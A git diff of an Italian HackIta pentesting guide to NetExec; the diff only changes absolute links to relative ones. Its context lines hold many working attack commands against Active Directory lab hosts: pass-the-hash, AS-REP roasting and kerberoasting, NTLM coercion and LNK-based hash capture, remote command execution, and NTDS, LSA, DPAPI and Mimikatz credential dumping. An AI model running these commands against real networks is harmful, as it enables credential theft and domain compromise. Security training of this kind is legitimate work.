@@ -19,7 +19,7 @@ featured: false
 
 NetExec (nxc) è il successore diretto di CrackMapExec — nato nel 2023 dopo l'abbandono del progetto originale. Stessa filosofia, codebase migliorata, moduli estesi, manutenzione attiva. Se usi ancora `crackmapexec` stai usando uno strumento fermo al 2021.
 
-Per il confronto con il vecchio CME: [CrackMapExec su HackIta](https://hackita.it/articoli/crackmapexec/)
+Per il confronto con il vecchio CME: [CrackMapExec su HackIta](/articoli/crackmapexec/)
 
 ***
 
@@ -73,7 +73,7 @@ Il primo passo in qualsiasi assessment interno è mappare la superficie. SMB è 
 nxc smb 10.10.10.0/24
 ```
 
-Output: nome macchina, OS, dominio, SMB signing (se `True` il relay è bloccato), versione SMB. Serve per capire se sei in un dominio, individuare host legacy e valutare la possibilità di [NTLM relay](https://hackita.it/articoli/responder/).
+Output: nome macchina, OS, dominio, SMB signing (se `True` il relay è bloccato), versione SMB. Serve per capire se sei in un dominio, individuare host legacy e valutare la possibilità di [NTLM relay](/articoli/responder/).
 
 ### Null session e accesso anonimo
 
@@ -113,7 +113,7 @@ nxc smb 10.10.10.0/24 -u hackita -p 'Hackita1@'    # verifica su tutta la subnet
 
 ### Pass-the-Hash (PTH)
 
-PTH usa l'hash NTLM direttamente senza conoscere la password in chiaro — standard dopo un dump SAM o NTDS. L'hash vuoto `aad3b435b51404eeaad3b435b51404ee` è la parte LM (sempre uguale), l'hash dopo i `:` è quello NTLM. Per approfondire: [Pass-the-Hash su HackIta](https://hackita.it/articoli/pass-the-hash/).
+PTH usa l'hash NTLM direttamente senza conoscere la password in chiaro — standard dopo un dump SAM o NTDS. L'hash vuoto `aad3b435b51404eeaad3b435b51404ee` è la parte LM (sempre uguale), l'hash dopo i `:` è quello NTLM. Per approfondire: [Pass-the-Hash su HackIta](/articoli/pass-the-hash/).
 
 ```bash
 nxc smb 10.10.10.10 -u hackita -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
@@ -138,7 +138,7 @@ nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --local-auth
 
 ### Certificato (PKINIT)
 
-Dopo aver ottenuto un PFX via ADCS, puoi usarlo per autenticarti direttamente. Vedi [ESC1-ESC16 su HackIta](https://hackita.it/articoli/adcs-esc1-esc16/).
+Dopo aver ottenuto un PFX via ADCS, puoi usarlo per autenticarti direttamente. Vedi [ESC1-ESC16 su HackIta](/articoli/adcs-esc1-esc16/).
 
 ```bash
 nxc ldap 10.10.10.10 -u hackita -p '' --certificate hackita.pfx
@@ -185,7 +185,7 @@ nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-
 
 ## Fase 3 — Enumerazione SMB
 
-[SMB](https://hackita.it/articoli/smb/) è il protocollo più ricco in un assessment AD — share, utenti, sessioni attive, policy.
+[SMB](/articoli/smb/) è il protocollo più ricco in un assessment AD — share, utenti, sessioni attive, policy.
 
 ### Share
 
@@ -267,7 +267,7 @@ SMB  10.10.10.10  445  DC01  1001: hackita.local\developerHackita (SidTypeUser)
 
 ## Fase 4 — Enumerazione LDAP
 
-LDAP espone l'intera struttura del dominio — utenti, macchine, deleghe, policy — accessibile con qualsiasi account a basso privilegio. Per approfondire: [ldapsearch su HackIta](https://hackita.it/articoli/ldapsearch/).
+LDAP espone l'intera struttura del dominio — utenti, macchine, deleghe, policy — accessibile con qualsiasi account a basso privilegio. Per approfondire: [ldapsearch su HackIta](/articoli/ldapsearch/).
 
 ### Base
 
@@ -300,7 +300,7 @@ nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --query "(name=administrator)" "m
 
 ### AS-REP Roasting
 
-`--asreproast` trova account senza pre-autenticazione Kerberos richiesta — il KDC risponde con un AS-REP crittografato con la password dell'utente, craccabile offline. `--no-preauth-targets` permette kerberoasting usando un account senza pre-auth come punto di partenza, senza credenziali valide. Per approfondire: [Kerberos su HackIta](https://hackita.it/articoli/kerberos/).
+`--asreproast` trova account senza pre-autenticazione Kerberos richiesta — il KDC risponde con un AS-REP crittografato con la password dell'utente, craccabile offline. `--no-preauth-targets` permette kerberoasting usando un account senza pre-auth come punto di partenza, senza credenziali valide. Per approfondire: [Kerberos su HackIta](/articoli/kerberos/).
 
 ```bash
 nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --asreproast asrep.txt
@@ -318,7 +318,7 @@ nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --kerberoast-account svc_mssql   
 
 ### BloodHound collection senza SharpHound
 
-Raccoglie tutti i dati necessari a BloodHound direttamente via LDAP/SMB — nessun eseguibile sul target. Per approfondire: [BloodHound su HackIta](https://hackita.it/articoli/bloodhound/).
+Raccoglie tutti i dati necessari a BloodHound direttamente via LDAP/SMB — nessun eseguibile sul target. Per approfondire: [BloodHound su HackIta](/articoli/bloodhound/).
 
 ```bash
 nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --bloodhound -ns 10.10.10.10 -c All
@@ -330,7 +330,7 @@ nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --bloodhound -ns 10.10.10.10 -c A
 
 ### ADCS — Certificate Authority
 
-`adcs` enumera le Certificate Authority presenti nel dominio, i template disponibili e le configurazioni potenzialmente vulnerabili (ESC1-ESC8). Per approfondire: [ADCS ESC1-ESC16 su HackIta](https://hackita.it/articoli/adcs-esc1-esc16/).
+`adcs` enumera le Certificate Authority presenti nel dominio, i template disponibili e le configurazioni potenzialmente vulnerabili (ESC1-ESC8). Per approfondire: [ADCS ESC1-ESC16 su HackIta](/articoli/adcs-esc1-esc16/).
 
 ```bash
 nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M adcs
@@ -475,7 +475,7 @@ nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M ntlm_reflection
 
 ### Coerce vulnerabilities
 
-`coerce_plus` testa in un colpo tutti i vettori di coercion NTLM (PetitPotam via MS-EFSRPC, DFSCoerce, PrinterBug via MS-RPRN, MSEven, ShadowCoerce). Con `LISTENER` specificato, forza il target ad autenticarsi verso il listener — da combinare con [Responder](https://hackita.it/articoli/responder/) o ntlmrelayx.
+`coerce_plus` testa in un colpo tutti i vettori di coercion NTLM (PetitPotam via MS-EFSRPC, DFSCoerce, PrinterBug via MS-RPRN, MSEven, ShadowCoerce). Con `LISTENER` specificato, forza il target ad autenticarsi verso il listener — da combinare con [Responder](/articoli/responder/) o ntlmrelayx.
 
 ```bash
 nxc smb 10.10.10.10 -u '' -p '' -M coerce_plus
@@ -527,7 +527,7 @@ nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M ioxidresolver
 
 ## Fase 7 — Esecuzione Comandi
 
-Non appena ottieni `(Pwn3d!)` puoi eseguire comandi remoti. NXC prova wmiexec di default ma supporta altri metodi — `smbexec` usa un servizio temporaneo, `atexec` usa Task Scheduler, `wmiexec` è il meno rumoroso. Per approfondire: [Impacket su HackIta](https://hackita.it/articoli/impacket/).
+Non appena ottieni `(Pwn3d!)` puoi eseguire comandi remoti. NXC prova wmiexec di default ma supporta altri metodi — `smbexec` usa un servizio temporaneo, `atexec` usa Task Scheduler, `wmiexec` è il meno rumoroso. Per approfondire: [Impacket su HackIta](/articoli/impacket/).
 
 ### CMD via SMB
 
@@ -594,7 +594,7 @@ nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --lsa secdump
 
 ### NTDS — tutti gli hash del dominio
 
-`--ntds` supporta due metodi: `drsuapi` (default — usa DCSync via RPC) e `vss` (Volume Shadow Copy — crea snapshot del disco). Per approfondire: [DCSync su HackIta](https://hackita.it/articoli/dcsync/).
+`--ntds` supporta due metodi: `drsuapi` (default — usa DCSync via RPC) e `vss` (Volume Shadow Copy — crea snapshot del disco). Per approfondire: [DCSync su HackIta](/articoli/dcsync/).
 
 ```bash
 nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --ntds
@@ -605,7 +605,7 @@ nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --ntds --enabled         # s
 
 ### DPAPI — credenziali browser e vault
 
-`--dpapi` decripta tutti i segreti DPAPI accessibili — password salvate in Chrome/Edge/Firefox, Windows Credential Manager, certificati utente. Con `cookies` dumpa anche i cookie del browser. Per approfondire: [DPAPI su HackIta](https://hackita.it/articoli/dpapi/).
+`--dpapi` decripta tutti i segreti DPAPI accessibili — password salvate in Chrome/Edge/Firefox, Windows Credential Manager, certificati utente. Con `cookies` dumpa anche i cookie del browser. Per approfondire: [DPAPI su HackIta](/articoli/dpapi/).
 
 ```bash
 nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --dpapi
@@ -637,7 +637,7 @@ nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M procdump      # usa Sysin
 
 ### Mimikatz remoto
 
-Esegue Mimikatz direttamente in remoto tramite SMB. Rumoroso — quasi tutti gli EDR lo rilevano. Per approfondire: [Mimikatz su HackIta](https://hackita.it/articoli/mimikatz/).
+Esegue Mimikatz direttamente in remoto tramite SMB. Rumoroso — quasi tutti gli EDR lo rilevano. Per approfondire: [Mimikatz su HackIta](/articoli/mimikatz/).
 
 ```bash
 nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M mimikatz
@@ -728,7 +728,7 @@ nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M notepad++
 
 ## Fase 9 — Coercion e NTLM Capture
 
-Questi moduli piazzano file su share scrivibili che forzano il client Windows ad autenticarsi verso un server controllato dall'attaccante — catturando hash NTLMv2 non appena un utente naviga la cartella. Da combinare con [Responder](https://hackita.it/articoli/responder/).
+Questi moduli piazzano file su share scrivibili che forzano il client Windows ad autenticarsi verso un server controllato dall'attaccante — catturando hash NTLMv2 non appena un utente naviga la cartella. Da combinare con [Responder](/articoli/responder/).
 
 ```bash
 # slinky: crea un file LNK (shortcut) che punta a un UNC path esterno
@@ -758,7 +758,7 @@ nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M enum_av
 
 ## MSSQL
 
-Per approfondire il servizio: [Porta 1433 MSSQL su HackIta](https://hackita.it/articoli/porta-1433-mssql/).
+Per approfondire il servizio: [Porta 1433 MSSQL su HackIta](/articoli/porta-1433-mssql/).
 
 ```bash
 # Verifica autenticazione
@@ -874,4 +874,4 @@ nxcdb    # console interattiva per interrogare il database
 
 ***
 
-*Guida aggiornata a NetExec v1.4.0+ (2026). Per approfondire Active Directory: [Guida AD su HackIta](https://hackita.it/articoli/active-directory/)*
+*Guida aggiornata a NetExec v1.4.0+ (2026). Per approfondire Active Directory: [Guida AD su HackIta](/articoli/active-directory/)*
